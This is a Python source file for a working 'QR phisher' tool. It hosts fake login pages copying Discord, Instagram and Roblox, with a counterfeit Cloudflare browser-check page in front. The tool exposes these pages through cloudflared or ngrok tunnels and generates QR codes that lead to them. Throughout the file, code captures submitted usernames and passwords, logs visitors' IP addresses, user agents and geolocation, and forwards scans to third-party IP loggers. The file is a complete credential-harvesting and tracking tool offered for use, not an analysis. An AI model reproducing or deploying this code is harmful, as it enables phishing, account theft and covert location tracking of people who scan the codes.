# QR Phisher + IP Grabber + QR IP Logger  (public tunnel edition)
# ------------------------------------------------------------------
# modes:
#   1) QR only (any url)
#   2) QR + local login page (creds + ips)
#   3) QR + pure IP grabber (redirect)
#   4) QR IP Logger  (wrap an ip-logger url, expose publicly)
#   5) view captured logs
#   6) exit
#
# public exposure:
#   - if `cloudflared` is on PATH, spins up a quick tunnel -> public https url
#   - else if `ngrok` is on PATH, uses that
#   - else falls back to LAN ip (only reachable on same wifi)
#
# the QR never shows localhost. it points at the public tunnel host.
#
# dependencies:
#   pip install qrcode[pil] requests
#   (optional) cloudflared  OR  ngrok  on PATH for public tunneling

from Config.Colors import *
from Config.Util import *

import os
import sys
import json
import time
import socket
import shutil
import signal
import threading
import subprocess
import urllib.request
import urllib.error
import re
import base64
import random
import string
from datetime import datetime
from http.server import BaseHTTPRequestHandler, ThreadingHTTPServer
from urllib.parse import urlparse, parse_qs, quote


# ============================================================
# DEPENDENCY HELPERS
# ============================================================

def _pip_install(pkg):
    try:
        rc = os.system(f"{sys.executable} -m pip install {pkg} --quiet")
        return rc == 0
    except Exception:
        return False


def ensure_deps():
    ok = True
    try:
        import qrcode  # noqa
    except ImportError:
        log("installing qrcode[pil] ...", "warn")
        if not _pip_install("qrcode[pil]"):
            log("failed to install qrcode[pil]", "err")
            ok = False
    try:
        import requests  # noqa
    except ImportError:
        log("installing requests ...", "warn")
        if not _pip_install("requests"):
            log("failed to install requests", "err")
            ok = False
    return ok


# ============================================================
# QR
# ============================================================

def make_qr(url, outfile=None, box_size=10, border=4):
    import qrcode
    from qrcode.constants import ERROR_CORRECT_H
    qr = qrcode.QRCode(
        version=None,
        error_correction=ERROR_CORRECT_H,
        box_size=box_size,
        border=border,
    )
    qr.add_data(url)
    qr.make(fit=True)
    img = qr.make_image(fill_color="black", back_color="white")
    if not outfile:
        ts = datetime.now().strftime("%Y%m%d%H%M%S")
        outfile = os.path.join(output_dir(), f"qr_{ts}.png")
    img.save(outfile)
    return outfile


def open_file(path):
    try:
        if os.name == "nt":
            os.startfile(path)  # noqa
        elif sys.platform == "darwin":
            os.system(f"open '{path}'")
        else:
            os.system(f"xdg-open '{path}' >/dev/null 2>&1 &")
    except Exception:
        pass


# ============================================================
# NETWORK HELPERS
# ============================================================

def get_lan_ip():
    s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    try:
        s.connect(("8.8.8.8", 80))
        return s.getsockname()[0]
    except Exception:
        return "127.0.0.1"
    finally:
        s.close()


def get_public_ip():
    for u in ("https://api.ipify.org", "https://ifconfig.me/ip", "https://icanhazip.com"):
        try:
            with urllib.request.urlopen(u, timeout=6) as r:
                ip = r.read().decode("utf-8", "ignore").strip()
            if ip:
                return ip
        except Exception:
            continue
    return ""


def geo_lookup(ip):
    if not ip or ip.startswith(("127.", "10.", "192.168.", "172.")):
        return {}
    try:
        url = (f"http://ip-api.com/json/{ip}"
               f"?fields=status,country,countryCode,region,regionName,city,"
               f"zip,lat,lon,timezone,isp,org,as,query,mobile,proxy,hosting")
        with urllib.request.urlopen(url, timeout=6) as r:
            d = json.loads(r.read().decode("utf-8", "ignore"))
        return d if d.get("status") == "success" else {}
    except Exception:
        return {}


# ============================================================
# TUNNEL MANAGERS
# ============================================================

class TunnelBase:
    name = "none"
    public_url = ""

    def start(self, port):
        raise NotImplementedError

    def stop(self):
        pass


class CloudflaredTunnel(TunnelBase):
    name = "cloudflared"

    def __init__(self):
        self.proc = None
        self.public_url = ""
        self.port = 0

    @staticmethod
    def available():
        return shutil.which("cloudflared") is not None

    def start(self, port, timeout=25):
        self.port = port
        cmd = ["cloudflared", "tunnel", "--url",
               f"http://127.0.0.1:{port}", "--no-autoupdate"]
        try:
            self.proc = subprocess.Popen(
                cmd,
                stdout=subprocess.PIPE,
                stderr=subprocess.STDOUT,
                text=True,
                bufsize=1,
            )
        except Exception as e:
            log(f"cloudflared failed to launch: {e}", "err")
            return ""

        url_re = re.compile(r"https://[a-z0-9\-]+\.trycloudflare\.com")
        t0 = time.time()
        while time.time() - t0 < timeout:
            line = self.proc.stdout.readline()
            if not line:
                if self.proc.poll() is not None:
                    break
                continue
            m = url_re.search(line)
            if m:
                self.public_url = m.group(0)
                # keep draining in the background
                threading.Thread(target=self._drain, daemon=True).start()
                return self.public_url
        return ""

    def _drain(self):
        try:
            while self.proc and self.proc.poll() is None:
                self.proc.stdout.readline()
        except Exception:
            pass

    def stop(self):
        if self.proc and self.proc.poll() is None:
            try:
                self.proc.terminate()
                try:
                    self.proc.wait(timeout=5)
                except subprocess.TimeoutExpired:
                    self.proc.kill()
            except Exception:
                pass


class NgrokTunnel(TunnelBase):
    name = "ngrok"

    def __init__(self):
        self.proc = None
        self.public_url = ""
        self.port = 0

    @staticmethod
    def available():
        return shutil.which("ngrok") is not None

    def start(self, port, timeout=25):
        self.port = port
        # start ngrok
        try:
            self.proc = subprocess.Popen(
                ["ngrok", "http", str(port), "--log=stdout", "--log-format=json"],
                stdout=subprocess.PIPE,
                stderr=subprocess.STDOUT,
                text=True,
                bufsize=1,
            )
        except Exception as e:
            log(f"ngrok failed to launch: {e}", "err")
            return ""

        t0 = time.time()
        while time.time() - t0 < timeout:
            line = self.proc.stdout.readline()
            if not line:
                if self.proc.poll() is not None:
                    break
                continue
            try:
                j = json.loads(line)
                u = j.get("url") or ""
                if u.startswith("https://") and ".ngrok" in u:
                    self.public_url = u
                    threading.Thread(target=self._drain, daemon=True).start()
                    return u
            except Exception:
                m = re.search(r"https://[a-z0-9\-]+\.ngrok(?:-free)?\.app", line)
                if m:
                    self.public_url = m.group(0)
                    threading.Thread(target=self._drain, daemon=True).start()
                    return self.public_url
        return ""

    def _drain(self):
        try:
            while self.proc and self.proc.poll() is None:
                self.proc.stdout.readline()
        except Exception:
            pass

    def stop(self):
        if self.proc and self.proc.poll() is None:
            try:
                self.proc.terminate()
                try:
                    self.proc.wait(timeout=5)
                except subprocess.TimeoutExpired:
                    self.proc.kill()
            except Exception:
                pass


class LanTunnel(TunnelBase):
    name = "lan"

    def __init__(self):
        self.public_url = ""

    def start(self, port, timeout=3):
        ip = get_lan_ip()
        self.public_url = f"http://{ip}:{port}"
        return self.public_url

    def stop(self):
        pass


def start_tunnel(port):
    """
    picks the best available tunnel.
    returns (tunnel, public_url, kind_label)
    """
    if CloudflaredTunnel.available():
        log("cloudflared detected — starting public tunnel ...", "info")
        t = CloudflaredTunnel()
        url = t.start(port)
        if url:
            log(f"public url -> {url}", "ok")
            return t, url, "cloudflared"
        log("cloudflared tunnel failed, falling back", "warn")
        t.stop()

    if NgrokTunnel.available():
        log("ngrok detected — starting public tunnel ...", "info")
        t = NgrokTunnel()
        url = t.start(port)
        if url:
            log(f"public url -> {url}", "ok")
            return t, url, "ngrok"
        log("ngrok tunnel failed, falling back", "warn")
        t.stop()

    log("no tunnel binary (cloudflared / ngrok) found — LAN-only mode", "warn")
    log("install one for public access: https://github.com/cloudflare/cloudflared", "info")
    t = LanTunnel()
    url = t.start(port)
    log(f"lan url -> {url}", "info")
    return t, url, "lan"


# ============================================================
# JSON LOGGER
# ============================================================

class JsonLogger:
    def __init__(self, path):
        self.path = path
        self.lock = threading.Lock()
        os.makedirs(os.path.dirname(path), exist_ok=True)

    def record(self, entry):
        with self.lock:
            try:
                with open(self.path, "a", encoding="utf-8") as f:
                    f.write(json.dumps(entry, ensure_ascii=False) + "\n")
            except Exception:
                pass

    def read_all(self):
        if not os.path.exists(self.path):
            return []
        out = []
        with open(self.path, "r", encoding="utf-8", errors="ignore") as f:
            for line in f:
                line = line.strip()
                if not line:
                    continue
                try:
                    out.append(json.loads(line))
                except Exception:
                    pass
        return out


# ============================================================
# TEMPLATES
# ============================================================

TEMPLATES = {
    "generic": """<!doctype html><html><head><meta charset="utf-8">
<meta name="viewport" content="width=device-width,initial-scale=1"><title>Sign in</title>
<style>
body{font-family:-apple-system,Segoe UI,Roboto,sans-serif;background:#0d1117;color:#c9d1d9;display:flex;align-items:center;justify-content:center;min-height:100vh;margin:0;padding:16px;box-sizing:border-box;}
.card{background:#161b22;border:1px solid #30363d;border-radius:8px;padding:32px;width:100%;max-width:360px;box-sizing:border-box;}
h1{font-size:20px;margin:0 0 20px;color:#fff;}
label{display:block;font-size:13px;color:#8b949e;margin-bottom:4px;}
input{width:100%;padding:10px;margin:0 0 14px;background:#0d1117;border:1px solid #30363d;color:#c9d1d9;border-radius:6px;box-sizing:border-box;font-size:15px;}
button{width:100%;padding:11px;background:#238636;color:#fff;border:none;border-radius:6px;cursor:pointer;font-weight:600;font-size:15px;}
</style></head><body><div class="card"><h1>Sign in</h1>
<form method="POST" action="/submit">
<label>Username or email</label><input type="text" name="username" required autofocus>
<label>Password</label><input type="password" name="password" required>
<button type="submit">Sign in</button></form></div></body></html>""",

    "discord": """<!doctype html><html><head><meta charset="utf-8">
<meta name="viewport" content="width=device-width,initial-scale=1"><title>Discord</title>
<style>
html,body{height:100%;margin:0;background:#36393f;font-family:Whitney,Segoe UI,sans-serif;}
.wrap{display:flex;align-items:center;justify-content:center;min-height:100vh;padding:16px;box-sizing:border-box;}
.box{background:#36393f;padding:32px;border-radius:5px;width:100%;max-width:420px;box-shadow:0 2px 10px rgba(0,0,0,.2);box-sizing:border-box;}
h2{color:#fff;text-align:center;margin:0 0 8px;}
p.sub{color:#b9bbbe;text-align:center;margin:0 0 20px;font-size:14px;}
label{display:block;color:#b9bbbe;font-size:12px;text-transform:uppercase;font-weight:600;margin-bottom:6px;}
input{width:100%;padding:10px;background:#303339;color:#dcddde;border:1px solid #222428;border-radius:3px;box-sizing:border-box;margin-bottom:16px;font-size:15px;}
button{width:100%;padding:11px;background:#5865f2;color:#fff;border:none;border-radius:3px;cursor:pointer;font-weight:500;font-size:15px;}
</style></head><body><div class="wrap"><div class="box">
<h2>Welcome back!</h2><p class="sub">We're so excited to see you again!</p>
<form method="POST" action="/submit">
<label>Email or Phone Number</label><input type="text" name="email" required autofocus>
<label>Password</label><input type="password" name="password" required>
<button type="submit">Log In</button></form></div></div></body></html>""",

    "instagram": """<!doctype html><html><head><meta charset="utf-8">
<meta name="viewport" content="width=device-width,initial-scale=1"><title>Instagram</title>
<style>
body{background:#fafafa;font-family:Segoe UI,Roboto,sans-serif;display:flex;align-items:center;justify-content:center;min-height:100vh;margin:0;padding:16px;box-sizing:border-box;}
.card{background:#fff;border:1px solid #dbdbdb;padding:40px 32px;width:100%;max-width:350px;text-align:center;box-sizing:border-box;}
.logo{font-family:cursive;font-size:42px;margin-bottom:30px;color:#262626;}
input{width:100%;padding:11px;margin-bottom:8px;background:#fafafa;border:1px solid #dbdbdb;border-radius:3px;box-sizing:border-box;font-size:14px;}
button{width:100%;padding:9px;background:#0095f6;color:#fff;border:none;border-radius:4px;cursor:pointer;font-weight:600;margin-top:8px;font-size:14px;}
</style></head><body><div class="card"><div class="logo">Instagram</div>
<form method="POST" action="/submit">
<input type="text" name="username" placeholder="Phone number, username, or email" required autofocus>
<input type="password" name="password" placeholder="Password" required>
<button type="submit">Log In</button></form></div></body></html>""",

    "roblox": """<!doctype html><html><head><meta charset="utf-8">
<meta name="viewport" content="width=device-width,initial-scale=1"><title>Roblox</title>
<style>
body{background:#f2f4f5;font-family:SourceSansPro,Helvetica,Arial,sans-serif;display:flex;align-items:center;justify-content:center;min-height:100vh;margin:0;padding:16px;box-sizing:border-box;}
.card{background:#fff;border:1px solid #e3e5e8;border-radius:8px;padding:32px;width:100%;max-width:380px;text-align:center;box-sizing:border-box;}
h1{color:#232527;font-size:22px;margin:0 0 24px;}
input{width:100%;padding:12px;margin:6px 0;background:#f2f4f5;border:1px solid #b8b8b8;border-radius:4px;box-sizing:border-box;font-size:14px;}
button{width:100%;padding:12px;background:#00b06f;color:#fff;border:none;border-radius:4px;cursor:pointer;font-weight:600;margin-top:12px;font-size:15px;}
</style></head><body><div class="card"><h1>Login to Roblox</h1>
<form method="POST" action="/submit">
<input type="text" name="username" placeholder="Username/Email" required autofocus>
<input type="password" name="password" placeholder="Password" required>
<button type="submit">Log In</button></form></div></body></html>""",

    "cloudflare": """<!doctype html><html><head><meta charset="utf-8">
<meta name="viewport" content="width=device-width,initial-scale=1"><title>Just a moment...</title>
<style>
body{font-family:-apple-system,Segoe UI,Roboto,sans-serif;background:#fff;color:#333;display:flex;align-items:center;justify-content:center;min-height:100vh;margin:0;padding:16px;box-sizing:border-box;}
.card{max-width:480px;text-align:center;}
h1{font-size:24px;font-weight:600;margin:0 0 12px;}
p{font-size:15px;color:#555;line-height:1.5;margin:0 0 20px;}
.spinner{width:36px;height:36px;border:3px solid #eaeaea;border-top-color:#f6821f;border-radius:50%;margin:0 auto 20px;animation:spin 0.9s linear infinite;}
@keyframes spin{to{transform:rotate(360deg);}}
.foot{font-size:12px;color:#999;margin-top:24px;}
</style></head><body><div class="card">
<div class="spinner"></div>
<h1>Checking your browser before accessing</h1>
<p>This process is automatic. Your browser will redirect shortly.</p>
<p>Please allow up to 5 seconds...</p>
<div class="foot">DDoS protection by Cloudflare</div>
</div>
<script>
setTimeout(function(){ window.location.href = "/login"; }, 3500);
</script>
</body></html>""",

    "redirect": """<!doctype html><html><head><meta charset="utf-8">
<meta name="viewport" content="width=device-width,initial-scale=1"><title>Redirecting...</title>
<style>
body{font-family:-apple-system,Segoe UI,Roboto,sans-serif;background:#0d1117;color:#c9d1d9;display:flex;align-items:center;justify-content:center;min-height:100vh;margin:0;}
p{font-size:15px;color:#8b949e;}
</style></head><body><p>Redirecting...</p>
<script>setTimeout(function(){ window.location.href = "/login"; }, 1200);</script>
</body></html>""",
}


# ============================================================
# HTTP HANDLER
# ============================================================

class Handler(BaseHTTPRequestHandler):
    template = ""
    landing_template = ""
    cred_logger = None
    ip_logger = None
    redirect_to = "https://www.google.com"
    server_version = "nginx"
    grab_enabled = True
    capture_enabled = True
    url_map = {}          # short_id -> target_url (for /go/)
    landing_gate = ""     # if set, "/" serves landing_template first
    log_all_paths = True

    def log_message(self, *a, **k):
        return

    # -------- helpers --------

    def _ip(self):
        for h in ("X-Forwarded-For", "X-Real-IP", "CF-Connecting-IP",
                  "True-Client-IP", "X-Client-IP"):
            v = self.headers.get(h)
            if v:
                return v.split(",")[0].strip()
        return self.client_address[0]

    def _send(self, code, body, ctype="text/html; charset=utf-8"):
        data = body.encode("utf-8") if isinstance(body, str) else body
        self.send_response(code)
        self.send_header("Content-Type", ctype)
        self.send_header("Content-Length", str(len(data)))
        self.send_header("Cache-Control", "no-store")
        self.send_header("X-Content-Type-Options", "nosniff")
        self.end_headers()
        try:
            self.wfile.write(data)
        except Exception:
            pass

    def _redirect(self, to):
        self.send_response(302)
        self.send_header("Location", to)
        self.send_header("Cache-Control", "no-store")
        self.end_headers()

    def _record_ip(self, note=""):
        if not self.ip_logger:
            return
        ip = self._ip()
        geo = geo_lookup(ip) if self.grab_enabled else {}
        entry = {
            "time": datetime.now().isoformat(),
            "ip": ip,
            "port": self.client_address[1],
            "path": self.path,
            "note": note,
            "ua": self.headers.get("User-Agent", ""),
            "referer": self.headers.get("Referer", ""),
            "accept_language": self.headers.get("Accept-Language", ""),
            "accept": self.headers.get("Accept", ""),
            "geo": geo,
        }
        self.ip_logger.record(entry)
        loc = ""
        if geo:
            loc = (f"  {geo.get('city','?')}, {geo.get('country','?')}"
                   f"  isp={geo.get('isp','?')}")
        flag = ""
        if geo.get("proxy"):
            flag += " [proxy]"
        if geo.get("hosting"):
            flag += " [hosting]"
        if geo.get("mobile"):
            flag += " [mobile]"
        log(f"[ip] {ip}{loc}{flag}  {note}", "ok")

    # -------- routes --------

    def do_HEAD(self):
        self.do_GET()

    def do_GET(self):
        parsed = urlparse(self.path)
        path = parsed.path
        qs = parse_qs(parsed.query)

        # 1) short link redirect: /go/<id>
        if path.startswith("/go/"):
            sid = path[len("/go/"):].strip("/")
            target = self.url_map.get(sid)
            if not target:
                self._record_ip(note=f"go-unknown-id:{sid}")
                self._redirect(self.redirect_to)
                return
            self._record_ip(note=f"qr-ip-logger -> {target}")
            self._redirect(target)
            return

        # 2) direct track endpoint: /track?to=<url>
        if path == "/track":
            to = (qs.get("to") or [self.redirect_to])[0]
            self._record_ip(note=f"track -> {to}")
            self._redirect(to)
            return

        # 3) landing gate (served at / if enabled)
        if path == "/" and self.landing_gate:
            self._record_ip(note="landing-gate")
            self._send(200, self.landing_template)
            return

        # 4) login page
        if path in ("/", "/index.html", "/login"):
            self._record_ip(note="viewed login")
            self._send(200, self.template)
            return

        # 5) static asset fallthrough (favicon etc.)
        if path == "/favicon.ico":
            self._send(204, b"")
            return

        # 6) anything else -> bounce
        if self.log_all_paths:
            self._record_ip(note=f"bounce from {path}")
        self._redirect(self.redirect_to)

    def do_POST(self):
        if self.path != "/submit":
            self._send(404, "not found")
            return
        length = int(self.headers.get("Content-Length", "0") or 0)
        raw = self.rfile.read(length).decode("utf-8", "ignore") if length else ""
        form = parse_qs(raw, keep_blank_values=True)

        ip = self._ip()
        geo = geo_lookup(ip) if self.grab_enabled else {}

        entry = {
            "time": datetime.now().isoformat(),
            "ip": ip,
            "port": self.client_address[1],
            "ua": self.headers.get("User-Agent", ""),
            "referer": self.headers.get("Referer", ""),
            "raw": raw,
            "form": {k: v for k, v in form.items()},
            "geo": geo,
        }
        if self.cred_logger:
            self.cred_logger.record(entry)

        u = (form.get("username") or form.get("email") or [""])[0]
        p = (form.get("password") or [""])[0]
        log(f"[pw] {ip}  user={u!r}  pass={p!r}", "ok")
        self._redirect(self.redirect_to)


# ============================================================
# SERVER WRAPPER
# ============================================================

class PhishServer:
    def __init__(self, host, port, template, cred_logfile, ip_logfile,
                 redirect_to, grab=True, capture=True, url_map=None,
                 landing_template="", log_all_paths=True):
        self.host = host
        self.port = port
        self.template = template
        self.landing_template = landing_template
        self.cred_logfile = cred_logfile
        self.ip_logfile = ip_logfile
        self.cred_logger = JsonLogger(cred_logfile) if (capture and cred_logfile) else None
        self.ip_logger = JsonLogger(ip_logfile) if (grab and ip_logfile) else None
        self.redirect_to = redirect_to
        self.grab = grab
        self.capture = capture
        self.url_map = url_map or {}
        self.log_all_paths = log_all_paths
        self.httpd = None
        self.thread = None

    def start(self):
        handler = type("Bound", (Handler,), {
            "template": self.template,
            "landing_template": self.landing_template,
            "cred_logger": self.cred_logger,
            "ip_logger": self.ip_logger,
            "redirect_to": self.redirect_to,
            "grab_enabled": self.grab,
            "capture_enabled": self.capture,
            "url_map": self.url_map,
            "landing_gate": "1" if self.landing_template else "",
            "log_all_paths": self.log_all_paths,
        })
        self.httpd = ThreadingHTTPServer((self.host, self.port), handler)
        self.thread = threading.Thread(target=self.httpd.serve_forever, daemon=True)
        self.thread.start()

    def stop(self):
        if self.httpd:
            try:
                self.httpd.shutdown()
                self.httpd.server_close()
            except Exception:
                pass


# ============================================================
# LIVE TAIL
# ============================================================

def tail(srv, tunnel=None, show_creds=True, show_ips=True):
    print()
    print(f"{WHITE}server running — ctrl+c to stop{RESET}")
    if tunnel:
        print(f"{DIM}tunnel -> {tunnel.name} ({tunnel.public_url}){RESET}")
    print(f"{DIM}creds  -> {srv.cred_logfile or '(disabled)'}{RESET}")
    print(f"{DIM}ips    -> {srv.ip_logfile or '(disabled)'}{RESET}")
    print()
    seen_ip = 0
    seen_cred = 0
    try:
        while True:
            time.sleep(1)
            if show_ips and srv.ip_logger:
                ips = srv.ip_logger.read_all()
                while seen_ip < len(ips):
                    e = ips[seen_ip]
                    g = e.get("geo") or {}
                    loc = ""
                    if g:
                        loc = (f"  {g.get('city','?')}, {g.get('country','?')}"
                               f"  isp={g.get('isp','?')}")
                    flags = []
                    if g.get("proxy"):
                        flags.append("proxy")
                    if g.get("hosting"):
                        flags.append("hosting")
                    if g.get("mobile"):
                        flags.append("mobile")
                    tag = ("  [" + ",".join(flags) + "]") if flags else ""
                    print(f"{CYAN}[ip]{RESET} {e['time']}  {e['ip']}  "
                          f"{e.get('note','')}{loc}{tag}")
                    seen_ip += 1
            if show_creds and srv.cred_logger:
                creds = srv.cred_logger.read_all()
                while seen_cred < len(creds):
                    e = creds[seen_cred]
                    f = e.get("form", {})
                    u = (f.get("username") or f.get("email") or [""])[0]
                    p = (f.get("password") or [""])[0]
                    g = e.get("geo") or {}
                    loc = f"  ({g.get('city','?')}, {g.get('country','?')})" if g else ""
                    print(f"{GREEN}[pw]{RESET} {e['time']}  {e['ip']}  "
                          f"user={u!r}  pass={p!r}{loc}")
                    seen_cred += 1
    except KeyboardInterrupt:
        print()
    finally:
        srv.stop()
        if tunnel:
            tunnel.stop()
        log("stopped", "ok")
        pause()


# ============================================================
# LOG PATH HELPERS
# ============================================================

def _log_paths(prefix):
    ts = datetime.now().strftime("%Y%m%d%H%M%S")
    od = output_dir()
    return (
        os.path.join(od, f"{prefix}_{ts}.log"),
        os.path.join(od, f"ipgrab_{ts}.log"),
    )


def _rand_id(n=6):
    alphabet = string.ascii_lowercase + string.digits
    return "".join(random.choice(alphabet) for _ in range(n))


# ============================================================
# MODE 1: QR ONLY
# ============================================================

def mode_qr_only():
    banner()
    log("QR only", "info")
    url = input_line("target url > ").strip()
    if not url:
        pause(); return
    if not url.startswith(("http://", "https://")):
        url = "https://" + url
    out = make_qr(url)
    log(f"QR -> {out}", "ok")
    log(f"points to -> {url}", "info")
    open_file(out)
    pause()


# ============================================================
# MODE 2: QR + LOGIN PAGE (public)
# ============================================================

def mode_qr_login():
    banner()
    log("QR + login page (creds + ips)", "info")
    print()

    keys = list(TEMPLATES.keys())
    for i, k in enumerate(keys, 1):
        print(f"  {GREEN}[{i}]{RESET} {k}")
    sel = input_line("template > ").strip()
    tname = keys[int(sel)-1] if sel.isdigit() and 1 <= int(sel) <= len(keys) else "generic"
    log(f"template: {tname}", "info")

    port_str = input_line("local port [8080] > ").strip() or "8080"
    try:
        port = int(port_str)
    except ValueError:
        port = 8080

    redirect_to = input_line("redirect after submit [https://www.google.com] > ").strip() \
        or "https://www.google.com"

    landing = ""
    if input_line("show a 'checking browser' landing page first? [y/n] ").strip().lower() in ("y", "yes", ""):
        landing = TEMPLATES["cloudflare"]

    cred_log, ip_log = _log_paths("qr_phish")
    srv = PhishServer(
        "0.0.0.0", port, TEMPLATES[tname], cred_log, ip_log,
        redirect_to, grab=True, capture=True, landing_template=landing
    )
    try:
        srv.start()
    except OSError as e:
        log(f"bind failed: {e}", "err"); pause(); return

    tunnel, public_url, kind = start_tunnel(port)
    log(f"tunnel kind -> {kind}", "info")
    log(f"public url  -> {public_url}", "info")

    out = make_qr(public_url + "/")
    log(f"QR -> {out}", "ok")
    open_file(out)
    tail(srv, tunnel=tunnel, show_creds=True, show_ips=True)


# ============================================================
# MODE 3: QR + PURE IP GRABBER (public)
# ============================================================

def mode_qr_ipgrab():
    banner()
    log("QR + pure IP grabber (public)", "info")
    port_str = input_line("local port [8080] > ").strip() or "8080"
    try:
        port = int(port_str)
    except ValueError:
        port = 8080

    redirect_to = input_line("redirect to [https://www.google.com] > ").strip() \
        or "https://www.google.com"

    _, ip_log = _log_paths("qr_ipgrab")
    srv = PhishServer("0.0.0.0", port, "", "", ip_log,
                      redirect_to, grab=True, capture=False)
    try:
        srv.start()
    except OSError as e:
        log(f"bind failed: {e}", "err"); pause(); return

    tunnel, public_url, kind = start_tunnel(port)
    log(f"tunnel kind -> {kind}", "info")
    log(f"public url  -> {public_url}", "info")

    target = f"{public_url}/track?to={quote(redirect_to, safe='')}"
    out = make_qr(target)
    log(f"QR -> {out}", "ok")
    log(f"points to -> {target}", "info")
    open_file(out)
    tail(srv, tunnel=tunnel, show_creds=False, show_ips=True)


# ============================================================
# MODE 4: QR IP LOGGER (wrap an ip-logger url, public)
# ============================================================

def mode_qr_ip_logger():
    banner()
    log("QR IP Logger (public)", "info")
    print(f"{DIM}paste any ip-logger url (grabify, iplogger, your own).{RESET}")
    print(f"{DIM}qr will point at a public short link we host, which logs the ip,{RESET}")
    print(f"{DIM}then 302s to your logger. both capture the scan.{RESET}")
    print()

    logger_url = input_line("ip-logger url > ").strip()
    if not logger_url:
        pause(); return
    if not logger_url.startswith(("http://", "https://")):
        logger_url = "https://" + logger_url

    label = input_line("short id (blank = auto) > ").strip()
    if not label:
        label = _rand_id(6)

    port_str = input_line("local port [8080] > ").strip() or "8080"
    try:
        port = int(port_str)
    except ValueError:
        port = 8080

    redirect_to = input_line("fallback redirect [https://www.google.com] > ").strip() \
        or "https://www.google.com"

    _, ip_log = _log_paths("qr_iplogger")
    url_map = {label: logger_url}

    srv = PhishServer(
        "0.0.0.0", port, "", "", ip_log,
        redirect_to, grab=True, capture=False, url_map=url_map
    )
    try:
        srv.start()
    except OSError as e:
        log(f"bind failed: {e}", "err"); pause(); return

    tunnel, public_url, kind = start_tunnel(port)
    log(f"tunnel kind -> {kind}", "info")

    short_url = f"{public_url}/go/{label}"
    log(f"short url -> {short_url}", "info")
    log(f"wraps     -> {logger_url}", "info")

    out = make_qr(short_url)
    log(f"QR -> {out}", "ok")
    open_file(out)

    print()
    print(f"{WHITE}flow:{RESET}")
    print(f"  scanner  ->  {short_url}")
    print(f"           ->  our server logs ip + geo")
    print(f"           ->  302 to {logger_url}")
    print(f"           ->  ip-logger logs again (double capture)")
    print()

    tail(srv, tunnel=tunnel, show_creds=False, show_ips=True)


# ============================================================
# MODE 5: VIEW LOGS
# ============================================================

def mode_view_logs():
    banner()
    log("Log Viewer", "info")
    od = output_dir()
    files = sorted(
        [f for f in os.listdir(od)
         if f.endswith(".log") and
            (f.startswith("qr_") or f.startswith("ipgrab_") or
             f.startswith("phish_") or f.startswith("harvest_"))],
        reverse=True)
    if not files:
        log("no logs", "warn"); pause(); return
    for i, f in enumerate(files, 1):
        size = os.path.getsize(os.path.join(od, f))
        print(f"  {GREEN}[{i:>2}]{RESET} {f:<45} {size} bytes")
    sel = input_line("open # > ").strip()
    if not sel.isdigit() or not (1 <= int(sel) <= len(files)):
        pause(); return
    path = os.path.join(od, files[int(sel)-1])
    print()
    print(f"{WHITE}── {os.path.basename(path)} ──{RESET}")
    with open(path, "r", encoding="utf-8", errors="ignore") as fh:
        for line in fh:
            line = line.strip()
            if not line:
                continue
            try:
                e = json.loads(line)
                g = e.get("geo") or {}
                loc = ""
                if g:
                    loc = (f"  {g.get('city','?')}, {g.get('country','?')}"
                           f"  isp={g.get('isp','?')}")
                f2 = e.get("form") or {}
                u = (f2.get("username") or f2.get("email") or [""])[0]
                p = (f2.get("password") or [""])[0]
                extra = f"  user={u!r} pass={p!r}" if (u or p) else ""
                print(f"{DIM}{e.get('time','')}{RESET}  {e.get('ip','')}  "
                      f"{e.get('note','')}{loc}{extra}")
            except Exception:
                print(line)
    if confirm("\ndelete this log? [y/n] "):
        try:
            os.remove(path)
            log("deleted", "ok")
        except Exception as e:
            log(f"failed: {e}", "err")
    pause()


# ============================================================
# MAIN
# ============================================================

def run():
    if not ensure_deps():
        pause()
        return

    # show tunnel availability once
    kinds = []
    if CloudflaredTunnel.available():
        kinds.append("cloudflared")
    if NgrokTunnel.available():
        kinds.append("ngrok")
    tunnel_note = ", ".join(kinds) if kinds else "none (LAN only)"

    while True:
        clear()
        banner()
        print(f"{WHITE}QR PHISHER + IP GRABBER  ·  public edition{RESET}")
        print(f"{DIM}available tunnels: {tunnel_note}{RESET}")
        print()
        print(f"  {GREEN}[1]{RESET} generate QR only")
        print(f"  {GREEN}[2]{RESET} generate QR + login page (creds + ips, public)")
        print(f"  {GREEN}[3]{RESET} generate QR + pure IP grabber (public)")
        print(f"  {GREEN}[4]{RESET} QR IP Logger — wrap an ip-logger link (public)")
        print(f"  {GREEN}[5]{RESET} view captured logs")
        print(f"  {GREEN}[6]{RESET} exit")
        print()
        choice = input_line("select > ").strip()
        if choice == "1":
            mode_qr_only()
        elif choice == "2":
            mode_qr_login()
        elif choice == "3":
            mode_qr_ipgrab()
        elif choice == "4":
            mode_qr_ip_logger()
        elif choice == "5":
            mode_view_logs()
        elif choice in ("6", "q", "quit", "exit"):
            return
        else:
            log("invalid choice", "warn")
            time.sleep(0.4)


if __name__ == "__main__":
    try:
        run()
    except KeyboardInterrupt:
        print()
        log("interrupted", "warn")